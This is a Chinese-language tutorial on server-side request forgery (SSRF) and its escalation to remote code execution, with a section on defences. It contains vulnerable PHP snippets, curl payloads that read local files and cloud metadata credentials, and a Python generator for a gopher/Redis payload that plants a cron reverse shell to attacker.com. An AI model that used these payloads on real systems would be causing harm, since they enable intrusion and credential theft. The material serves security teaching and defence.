# SSRF与RCE

## 概述

服务端请求伪造（Server-Side Request Forgery, SSRF）是OWASP Top 10中高频出现的漏洞类型。攻击者通过构造恶意URL，诱使服务端向内部系统发起请求，进而实现内网探测、数据窃取甚至远程代码执行（RCE）。云原生架构中SSRF的危害被进一步放大，因为元数据服务（Metadata Service）和内部微服务的暴露面更广。

## SSRF基础

### SSRF原理

SSRF发生在服务端接收用户提供的URL参数并发起HTTP请求的场景：

```php
// 漏洞代码：任意URL访问
$url = $_GET['url'];
$response = file_get_contents($url);
echo $response;

// 漏洞代码：图片下载功能
$img_url = $_POST['image_url'];
$img_data = file_get_contents($img_url);
file_put_contents('downloads/' . basename($img_url), $img_data);
```

### 常用协议

| 协议 | 用途 | 支持场景 |
|------|------|----------|
| `http://` | 访问HTTP服务 | 内网Web应用探测 |
| `https://` | 访问HTTPS服务 | 需TLS的内网服务 |
| `file://` | 读取本地文件 | 文件读取（信息泄露） |
| `gopher://` | 发送任意TCP数据 | SSRF转RCE（Redis/MySQL） |
| `dict://` | DICT协议查询 | 端口探测和服务指纹 |
| `ftp://` | FTP协议 | 内网FTP服务探测 |
| `phar://` | PHP反序列化 | PHP应用特定攻击 |

```bash
# 利用file://读取敏感文件
curl "http://target.com/ssrf.php?url=file:///etc/passwd"
curl "http://target.com/ssrf.php?url=file:///proc/1/environ"

# dict协议端口探测
curl "http://target.com/ssrf.php?url=dict://127.0.0.1:6379/info"
curl "http://target.com/ssrf.php?url=dict://127.0.0.1:3306"
```

### 内网地址空间

SSRF常用于探测内部网络，目标范围包括：

```text
# 回环地址
127.0.0.1/8
localhost

# 私有地址
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16

# 链路本地地址
169.254.0.0/16

# IPv6回环
[::1]
[0:0:0:0:0:0:0:1]
```

## 云元数据攻击

云平台提供元数据服务（Metadata Service）供实例获取自身信息，SSRF可滥用此服务窃取凭据。

### AWS元数据

```bash
# 获取IAM角色临时凭据（IMDSv1）
curl "http://169.254.169.254/latest/meta-data/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name"

# 获取用户数据（启动脚本，常含敏感信息）
curl "http://169.254.169.254/latest/user-data/"

# IMDSv2需要PUT token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl "http://169.254.169.254/latest/meta-data/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

### GCP元数据

```bash
# GCP元数据端点
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# 获取服务账户Token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# 获取项目和实例信息
curl "http://metadata.google.internal/computeMetadata/v1/project/" \
  -H "Metadata-Flavor: Google"
```

### Azure元数据

```bash
# Azure实例元数据
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# 获取托管身份Token
curl "http://169.254.169.254/metadata/identity/oauth2/token" \
  -H "Metadata: true" \
  --data-urlencode "api-version=2018-02-01" \
  --data-urlencode "resource=https://management.azure.com/"
```

### 阿里云元数据

```bash
# 阿里云ECS元数据
curl "http://100.100.100.200/latest/meta-data/"
curl "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
```

## SSRF转RCE

### Redis未授权访问

通过gopher协议SSRF可向Redis服务发送任意命令，实现RCE：

```python
# SSRF + Redis CRON RCE
import urllib.parse

redis_payload = """
*1
$8
FLUSHALL
*3
$3
SET
$4
shell
$6
\\n\\n\\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\\n\\n\\n
*4
$6
CONFIG
$3
SET
$3
dir
$16
/var/spool/cron/
*4
$6
CONFIG
$3
SET
$10
dbfilename
$4
root
*1
$4
SAVE
""".replace('\n', '\r\n')

encoded = urllib.parse.quote(redis_payload)
ssrf_url = f"gopher://127.0.0.1:6379/_{encoded}"
print(ssrf_url)
```

### MySQL未授权

```bash
# 利用SSRF探测并攻击内网MySQL
# gopher协议构造MySQL查询
gopher://mysql_host:3306/_payload
```

### Memcached未授权

```bash
# 利用SSRF与内网Memcached交互
# 读取缓存数据获取Session信息
gopher://memcached_host:11211/_get%20session_key
```

## Blind SSRF检测

当响应中不直接返回请求结果时，需要通过外部交互（Out-of-Band）检测SSRF。

### Burp Collaborator

Burp Suite Professional内置的Collaborator功能提供可定制的DNS/HTTP监听服务：

```bash
# 使用Collaborator生成的子域名进行SSRF检测
url=http://your-collaborator-id.burpcollaborator.net/test

# 注入到请求中
POST /fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://your-collaborator-id.burpcollaborator.net/ssrf"}
```

### Interactsh

开源替代方案，支持DNS/HTTP/SMTP交互检测：

```bash
# 生成监听端
interactsh-client

# 构造Payload
url=http://your-id.oast.fun/ssrf-test
```

### OAST（Out-of-Asset Security Testing）

通过DNS日志检测盲SSRF：

```bash
# 利用DNS解析检测
url=http://random-hash.burpcollaborator.net

# 检测到DNS查询则确认SSRF存在

# 利用HTTP回调进一步确认
url=http://random-hash.burpcollaborator.net/callback
```

## 防御措施

### URL白名单

```python
# Python示例：URL白名单验证
from urllib.parse import urlparse

ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']
BLOCKED_SCHEMES = ['file', 'gopher', 'dict', 'phar']

def validate_url(url):
    parsed = urlparse(url)
    
    # 协议白名单
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Scheme not allowed")
    
    # 主机白名单
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    
    # 禁止内网地址
    if is_private_ip(parsed.hostname):
        raise ValueError("Internal IP not allowed")
    
    return url
```

### DNS重绑定防护

攻击者可通过DNS重绑定绕过IP白名单：

```python
# 双重DNS解析验证
import socket

def validate_host(hostname):
    # 第一次解析
    first_ip = socket.gethostbyname(hostname)
    check_ip(first_ip)
    
    # 延迟后再次解析
    import time
    time.sleep(0.5)
    
    # 第二次解析
    second_ip = socket.gethostbyname(hostname)
    
    # 如果两次结果不同，疑似DNS重绑定攻击
    if first_ip != second_ip:
        raise ValueError("DNS rebinding detected")
```

### 元数据服务保护

**AWS IMDSv2：**

```bash
# 启用IMDSv2（需要PUT请求获取Token）
# 创建实例时设置
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled

# 默认跳数限制
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-put-response-hop-limit 1
```

### 其他防御措施

- **禁用不必要的协议**：不在URL解析器中支持`file://`、`gopher://`等非HTTP协议
- **限制重定向**：检查重定向目标是否也经过安全验证
- **统一出口IP**：对外请求通过统一代理，便于审计和管控
- **网络隔离**：应用服务器与内网核心服务分离，减少攻击面

## 检测与利用工具

| 工具 | 用途 | 特点 |
|------|------|------|
| SSRFmap | SSRF自动检测与利用 | 支持gopher转Redis/RCE |
| Gopherus | gopher协议Payload生成 | Python编写，支持MySQL/Redis |
| Interactsh | 带外检测 | 开源，支持自定义域名 |
| See-SURF | Python SSRF检测框架 | 可集成到CI/CD |

## 参考资源

- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [Interactsh](https://github.com/projectdiscovery/interactsh)
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
